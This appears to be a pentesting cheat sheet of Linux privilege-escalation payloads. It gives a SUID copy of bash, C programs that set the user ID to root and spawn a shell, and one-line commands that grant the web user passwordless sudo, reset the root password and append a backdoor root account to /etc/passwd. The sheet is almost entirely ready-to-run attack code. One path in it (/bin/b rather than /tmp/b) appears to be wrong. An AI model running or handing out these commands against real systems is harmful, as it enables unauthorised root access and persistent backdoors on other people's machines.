# Payloads to execute

## Bash

```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```

## C

```c
#gcc payload.c -o payload
int main(void){
    setresuid(0, 0, 0); #Set as user suid user
    system("/bin/sh");
    return 0;
}
```

```c
#gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setuid(getuid());
    system("/bin/bash");
    return 0;
}
```

## Scripts

Can you make root execute something?

### **www-data to sudoers**

```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

### **Change root password**

```bash
echo "root:hacked" | chpasswd
```

### Add new root user to /etc/passwd

```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```



